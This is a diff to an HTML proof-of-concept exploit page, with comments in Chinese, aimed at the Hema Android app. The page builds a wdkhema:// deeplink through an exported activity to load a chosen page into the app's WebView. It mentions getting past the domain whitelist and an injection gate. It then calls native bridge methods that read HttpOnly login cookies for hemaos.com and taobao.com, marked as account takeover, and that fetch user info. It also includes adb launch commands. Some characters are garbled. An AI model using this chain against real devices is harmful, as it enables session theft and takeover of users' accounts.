@@ -53,7 +53,7 @@
   <h2>⓪ 发射器 — deeplink 进 pha 容器（段1 载入）</h2>
   <div class="desc">
     入口 = <code>DispatchActivity</code>(exported，<code>wdkhema://main</code> + AppLink <code>h5.hemaos.com/main</code>)。<br>
-    ★正确形态 = <code>wdkhema://main?url=&lt;目标&gt;</code>（<code>main</code> 固定 host/path，目标放 <code>url</code> 参���）。<b>目标 url 你原样填，代码不加工</b>（不 strip / 不补 // / 不拼尾巴）。<br>
+    ★正确形态 = <code>wdkhema://main?url=&lt;目标&gt;</code>（<code>main</code> 固定 host/path，目标放 <code>url</code> 参数）。<b>目标 url 你原样填，代码不加工</b>（不 strip / 不补 // / 不拼尾巴）。<br>
     要拿到桥，目标 URL 的 host 需过后缀白名单（<code>*.hemaos.com</code>）——填盒马自有域页面，或用你绕过注入闸的形态。
   </div>
   <label>目标 URL（原样组装，代码不加工）
@@ -67,15 +67,15 @@
 <div class="card">
   <h2>A. 读登录 Cookie · WVCookie.readCookies <span class="badge" style="background:#3a1414;color:#ff6b6b">crown/ATO</span></h2>
   <div class="desc">经 pha→WindVane 转发到底层 <code>__windvane__</code>。读含 HttpOnly 会话 Cookie。url 指盒马/淘宝域。</div>
-  <button class="crown" onclick="wv('WVCookie','readCookies',{url:'https://www.hemaos.com'},'A')">readCookies(hemaos.com)</button>
-  <button class="crown" onclick="wv('WVCookie','readCookies',{url:'https://www.taobao.com'},'A2')">readCookies(taobao.com)</button>
+  <button class="crown" onclick="wv('WVCookie','readCookies',{url:'https://www.hemaos.com'},'outA')">readCookies(hemaos.com)</button>
+  <button class="crown" onclick="wv('WVCookie','readCookies',{url:'https://www.taobao.com'},'outA2')">readCookies(taobao.com)</button>
   <pre id="outA">—</pre><pre id="outA2">—</pre>
 </div>
 
 <div class="card">
   <h2>B. 用户信息 · pha user.getUserInfo <span class="badge" style="background:#3a1414;color:#ff6b6b">crown</span></h2>
   <div class="desc">pha 原生桥。返回用户信息 / uid。</div>
-  <button class="crown" onclick="ph('user','getUserInfo',{},'B')">user.getUserInfo</button>
+  <button class="crown" onclick="ph('user','getUserInfo',{},'outB')">user.getUserInfo</button>
   <pre id="outB">—</pre>
 </div>
 
@@ -102,9 +102,9 @@
 <script>
 var PHA = "__pha_bridge_engine__";
 var seq = 0;
-function log(id,o){var e=document.getElementById(id);e.textContent='['+new Date().toLocaleTimeString()+']\n'+((typeof o==='string')?o:JSON.stringify(o,null,2));}
-function setBadge(id,cls,txt){var e=document.getElementById(id);e.className='badge '+cls;e.textContent=txt;}
-function trace(m){var e=document.getElementById('out_trace');e.textContent+=m+'\n';e.scrollTop=e.scrollHeight;}
+function log(id,o){var e=document.getElementById(id);if(!e){trace('[log] 无元素 id='+id);return;}e.textContent='['+new Date().toLocaleTimeString()+']\n'+((typeof o==='string')?o:JSON.stringify(o,null,2));}
+function setBadge(id,cls,txt){var e=document.getElementById(id);if(!e)return;e.className='badge '+cls;e.textContent=txt;}
+function trace(m){var e=document.getElementById('out_trace');if(!e){try{console.log('[trace] '+m);}catch(_){}return;}e.textContent+=m+'\n';e.scrollTop=e.scrollHeight;}
 
 /* ---- 自诊断探针1：拦截 webview.evaluateJavascript，看 native 想往页面执行什么 JS ---- */
 (function(){
@@ -120,14 +120,14 @@ function trace(m){var e=document.getElementById('out_trace');e.textContent+=m+'\
   }catch(e){ trace('挂钩 evaluateJavascript 失败: '+e); }
 })();
 
-/* ---- 自诊断探针2：全局回调钩子（native 回 __pha_native_to_js__(id,err,data)）---- */
+/* ---- 自诊断探针2：��局回调钩子（native 回 __pha_native_to_js__(id,err,data)）---- */
 // native 经 evaluateJavascript 调 __pha_native_to_js__(...)。这里无论 id 匹不匹配都 trace 一条，
 // 并把结果路由到对应 DOM 卡（id = DOM 元素 id）。
 window.__pha_native_to_js__ = function(id, err, data){
-  trace('[native回调] __pha_native_to_js__(id='+id+', err='+err+', data='+String(data).slice(0,200)+')');
+  trace('[native回调] id='+id+' err='+err+' data='+String(data).slice(0,200));
   var el = document.getElementById(id);
   if(el){ el.textContent='[回 '+new Date().toLocaleTimeString()+']\nerr='+err+'\ndata='+data; }
-  else { trace('  ↳ 无 DOM 元素 id='+id+'（回调 id 与卡片不匹配）'); }
+  else { trace('  ↳ 无 DOM 元素 id="'+id+'"（回调 id 与卡片 id 不匹配——把按钮 refId 改成已存在的卡片 id）'); }
 };
 
 /* ---- pha 原生调用：__pha_bridge_engine__.call(refId, module, method, paramsJSON) ---- */
@@ -192,12 +192,12 @@ function buildDeep(){
   var raw  = 'wdkhema://main?url=' + enc;
   var raw2 = 'https://h5.hemaos.com/main?url=' + enc;   // AppLink 等价形态
   document.getElementById('golink').href = raw;
-  log('out_dl', 'deeplink(原样组装):\n'+raw+'\n\nAppLink 等价:\n'+raw2);
+  log('out_dl', 'deeplink(原样组装):\n'+raw+'\n\nAppLink 等���:\n'+raw2);
   log('out_adb',
     '# adb 复核(整条单引号包住):\n'+
     "adb shell am start -a android.intent.action.VIEW -d '"+raw+"' com.wudaokou.hippo\n"+
     "adb shell am start -a android.intent.action.VIEW -d '"+raw2+"' com.wudaokou.hippo\n"+
-    '# 你填的目标 url ��原样组装，代码未做任何加工。');
+    '# 你填的目标 url 已原样组装，代码未做任何加工。');
 }
 document.getElementById('golink').addEventListener('click',function(){ log('out_dl','已发起: '+this.getAttribute('href')); });
 buildDeep();
